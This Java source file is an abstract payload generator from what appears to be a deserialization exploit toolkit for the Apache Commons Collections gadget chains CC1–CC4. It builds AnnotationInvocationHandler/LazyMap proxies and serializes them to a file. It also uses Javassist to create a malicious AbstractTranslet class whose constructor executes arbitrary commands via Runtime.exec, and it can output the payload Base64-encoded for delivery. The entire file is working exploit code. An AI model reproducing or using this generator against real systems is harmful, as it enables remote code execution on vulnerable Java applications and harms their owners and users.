package com.constant;

import cn.hutool.core.codec.Base64;
import com.exp.collections.CommonsCollections1;
import javassist.*;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.lang.reflect.Modifier;
import java.util.Map;


public abstract class PayloadGenerator {

    /***
     * 生成payload文件
     * @return payload
     */
    protected abstract File generatorPayload(String[] cmd);
    private String path;

    //创建动态代理并序列化数据，用于CC1/CC3
    protected File getFile(Map targetMap) {
        Class<?> clazz = null;
        try {
            Constructor<?> declaredConstructor = getConstructorByName("sun.reflect.annotation.AnnotationInvocationHandler",Modifier.PRIVATE,Class.class, Map.class);
            declaredConstructor.setAccessible(true);
            InvocationHandler invocationHandler = (InvocationHandler)declaredConstructor.newInstance(Override.class, targetMap);
            Map mapProxy = (Map) Proxy.newProxyInstance(CommonsCollections1.class.getClassLoader(), LazyMap.class.getInterfaces(), invocationHandler);
            Object exp = declaredConstructor.newInstance(Override.class, mapProxy);
            return serializable(exp);
        } catch (InvocationTargetException | InstantiationException | IllegalAccessException exception) {
            throw new RuntimeException(exception);
        }
    }
    protected File serializable(Object exp){
        path = "exp.exp";
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(path);
            ObjectOutputStream objectInputStream = new ObjectOutputStream(fileOutputStream);
            objectInputStream.writeObject(exp);
            objectInputStream.flush();
            objectInputStream.close();
            return new File(path);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void unSerializable(){
        try {
            if (path == null) path = "exp.exp";
            FileInputStream fileInputStream = new FileInputStream(path);
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new RuntimeException(e);
        }
    }

    /***
     * 获取poc的序列化结果
     * @param file exp
     * @return 结果:文件或者base64值
     */
    protected String getExpValue(File file, ExpValueType expValueType){
        if (expValueType == ExpValueType.BASE64){
            return Base64.encode(file);
        }
        else if (expValueType == ExpValueType.FILE){
            return file.getAbsolutePath();
        }
        return null;
    }

    public String getExp(ExpValueType expValueType,String[] cmd){
        File exp = generatorPayload(cmd);
        return getExpValue(exp, expValueType);
    }

    /**
     * 创建恶意类，用于CC2/CC4
     * @param cmd 执行的命令
     * @return 字节类型文件数据
     */
    protected byte[][] createClassFile(String[] cmd) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < cmd.length; i++) {
            if (cmd.length == 1)
            {
                stringBuilder.append("\"");
                stringBuilder.append(cmd[i]);
                stringBuilder.append("\"");
            }
            else {
                if (i == 0){
                    stringBuilder.append("\"");
                    stringBuilder.append(cmd[i]);
                    stringBuilder.append("\"");
                    stringBuilder.append(",");

                }
                else if (i == cmd.length - 1){
                    stringBuilder.append("\"");
                    stringBuilder.append(cmd[i]);
                    stringBuilder.append("\"");
                }else {
                    stringBuilder.append("\"");
                    stringBuilder.append(cmd[i]);
                    stringBuilder.append("\"");
                    stringBuilder.append(",");

                }
            }

        }
        System.out.println(stringBuilder);
        CtClass ctClass = ClassPool.getDefault().makeClass("EXP");
        ClassPool.getDefault().importPackage("java.io.IOException");
        CtConstructor ctConstructor = null;

        try {
            // 设置父类
            ctClass.setSuperclass(ClassPool.getDefault().getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
            ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            ctConstructor.setBody("{" +
                    "try {\n" +
                    "            Runtime.getRuntime().exec(new String[]{" + stringBuilder + "});\n" +
                    "        } catch (IOException e) {\n" +
                    "            throw new RuntimeException(e);\n" +
                    "        }" +
                    "}"
            );
            ctClass.addConstructor(ctConstructor);
            //添加实现方法
            CtMethod ctMethod = new CtMethod(CtClass.voidType,"transform",new CtClass[]{ClassPool.getDefault().get("com.sun.org.apache.xalan.internal.xsltc.DOM"),ClassPool.getDefault().get("com.sun.org.apache.xml.internal.serializer.SerializationHandler[]")},ctClass);
            CtMethod ctMethod1 = new CtMethod(CtClass.voidType,"transform",new CtClass[]{ClassPool.getDefault().get("com.sun.org.apache.xalan.internal.xsltc.DOM"),ClassPool.getDefault().get("com.sun.org.apache.xml.internal.dtm.DTMAxisIterator"),ClassPool.getDefault().get("com.sun.org.apache.xml.internal.serializer.SerializationHandler")},ctClass);
            ctMethod1.setExceptionTypes(new CtClass[]{ClassPool.getDefault().get("com.sun.org.apache.xalan.internal.xsltc.TransletException")});
            ctMethod.setExceptionTypes(new CtClass[]{ClassPool.getDefault().get("com.sun.org.apache.xalan.internal.xsltc.TransletException")});
            ctMethod.setBody("{}");
            ctMethod1.setBody("{}");
            ctClass.addMethod(ctMethod1);
            ctClass.addMethod(ctMethod);
            //设置方法
            ctClass.writeFile("./");
            ctClass.detach();
            return new byte[][]{ctClass.toBytecode()};
        } catch (NotFoundException | CannotCompileException | IOException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * 根据包名及参数类型获取构造函数
     * @param name
     * @param parameterTypes
     * @return
     */
    protected Constructor<?> getConstructorByName(String name,int modifier,Class<?>... parameterTypes){
        if (modifier == Modifier.PUBLIC){
            try {
                return Class.forName(name).getConstructor(parameterTypes);
            } catch (NoSuchMethodException | ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
        }
        else {
            try {
                return Class.forName(name).getDeclaredConstructor(parameterTypes);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    /***
     * 设置指定对象字段值
     * @param fieldName 字段名
     * @param obj 对象
     * @param value 要设定的值
     * @param modifier 字段属性，是否公开
     */
    protected void setValueByField(String fieldName,Object obj,Object value, int modifier){
        if (modifier == Modifier.PUBLIC){
            try {
                Class<?> aClass = Class.forName(obj.getClass().getName());
                Field declaredField = aClass.getField(fieldName);

                declaredField.set(obj,value);
            } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        }
        else {
            try {
                Class<?> aClass = Class.forName(obj.getClass().getName());
                Field declaredField = aClass.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                declaredField.set(obj,value);
            } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        }

    }

    public PayloadGenerator() {
    }

}
